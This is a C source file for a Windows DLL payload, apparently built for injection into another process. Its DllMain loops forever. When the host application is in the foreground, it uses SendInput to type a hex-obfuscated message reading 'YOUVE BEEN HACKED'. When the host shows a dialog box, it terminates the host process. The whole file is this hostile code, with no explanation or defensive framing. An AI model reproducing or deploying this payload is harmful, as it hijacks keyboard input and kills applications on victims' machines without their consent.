#include <Windows.h>

const int MESSAGE[] = { 
    0x59, 0x4F, 0x55, 0x56, 0x45, 0x20, 
    0x42, 0x45, 0x45, 0x4E, 0x20, 0x48, 
    0x41, 0x43, 0x4B, 0x45, 0x44 
};

void Send(int code) {
    INPUT input[2] = {0};

    input[0].type = input[1].type = INPUT_KEYBOARD;
    input[0].ki.wVk = input[1].ki.wVk = code;
    input[1].ki.dwFlags = KEYEVENTF_KEYUP;
    input[0].ki.dwExtraInfo = input[1].ki.dwExtraInfo = GetMessageExtraInfo();

    SendInput(2, input, sizeof(INPUT));
}

BOOL IsDialog(HWND hwnd) {
    char name[256];

    GetClassName(hwnd, name, sizeof(name));

    return (strcmp(name, "#32770") == 0);
}

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    DWORD pid, pidActive;

    pid = GetCurrentProcessId();

    int msg_len = sizeof(MESSAGE) / sizeof(MESSAGE[0]);

    while(1) {
        HWND fg = GetForegroundWindow();

        GetWindowThreadProcessId(fg, &pidActive);

        if(pidActive == pid) {
            if(IsDialog(fg) == FALSE) {
                for(int i = 0; i < msg_len; i++) {
                    Send(MESSAGE[i]);
                    Sleep(5);
                }

                return TRUE;
            } else {
                HANDLE handle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

                TerminateProcess(handle, 1);
            }
        }

        Sleep(2000);
    }

    return TRUE;
}